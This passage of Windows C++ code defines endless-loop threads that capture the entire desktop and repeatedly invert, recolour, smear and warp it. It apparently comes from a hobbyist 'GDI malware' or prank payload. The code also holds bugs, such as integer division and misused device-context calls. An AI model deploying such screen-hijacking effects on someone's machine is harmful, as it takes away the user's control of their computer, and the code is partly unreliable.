            StretchBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

            RGBQUAD_t rgbquadCopy;

            for (int x = 0; x < w; x++)
            {
                for (int y = 0; y < h; y++)
                {
                    int index = y * w + x;

                    int cx = x - (w / 2);
                    int cy = y - (h / 2);

                    int fx = i * (cbrt((x ^ y) + (cx ^ cy)));

                    rgbquadCopy = rgbquad[index];

                    hslcolor = RGBtoHSL(rgbquadCopy);
                    hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);
                    rgbquad[index] = HSLtoRGB(hslcolor);
                }
            }

            i++;

            StretchBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }

        return 0;
    }

    // ??? effect - BitBlts neon
    DWORD WINAPI Blit(LPVOID lpParam)
    {
        while (true)
        {
            HDC hdc = GetDC(0);
            BitBlt(hdc, 4, 4, w, h, hdc, 0, 0, SRCINVERT);
            BitBlt(hdc, 0, 0, w, h, hdc, 4, 4, SRCPAINT);
            Sleep(1);
            ReleaseDC(0, hdc);
        }
    }

    // blit again effect AAAAAAAAAAAAAAA - masher
    DWORD WINAPI Blit2(LPVOID lpParam)
    {
        while (true)
        {
            HDC hdc = GetDC(0);
            BitBlt(hdc, 5, 5, rand() % w, rand() % h, hdc, 0, 0, SRCCOPY);
        }
    }

    // last shader - Plasma HSL and RGBQUAD
    DWORD WINAPI GDIShader10(LPVOID lpParam)
    {
        HDC hdc = GetDC(0);
        HDC dcCopy = CreateCompatibleDC(hdc);

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;


        PRGBQUAD_t rgbquad = NULL;
        HSL hslcolor;

        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        INT i = 0;

        while (1)
        {
            hdc = GetDC(NULL);
            StretchBlt(dcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

            RGBQUAD_t rgbquadCopy;

            for (int x = 0; x < w; x++)
            {
                for (int y = 0; y < h; y++)
                {
                    int index = y * w + x;

                    int cx = x - (w / 2);
                    int cy = y - (h / 2);

                    int fx = i * (cbrt((cx * cx) + (cy * cy)));

                    rgbquadCopy = rgbquad[index];

                    hslcolor = RGBtoHSL(rgbquadCopy);
                    hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);
                    hslcolor.s = 9.f;
                    rgbquad[index] = HSLtoRGB(hslcolor);
                }
            }

            i++;

            StretchBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }

        return 0;
    }

    // last effect - Generic bright masher + Warp dark blocks (made by JhoPro)
    DWORD WINAPI Warp(LPVOID lpParam)
    {
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        float warpIntensity = 9;

        while (1)
        {
            for (int i = 1; i <= warpIntensity; i++)
            {
                int size = rand() % 400;

                int wsrc = rand() % w;
                int hsrc = rand() % h;

                BitBlt(dc, wsrc + rand() % i, hsrc + rand() % i, size, size, dc, wsrc, hsrc, SRCAND);
                BitBlt(dc, rand() % 9, rand() % 9, wsrc, hsrc, dc, rand() % 9, rand() % 9, SRCPAINT);
            }

            Sleep(1);
        }

        return 0x00;
    }
}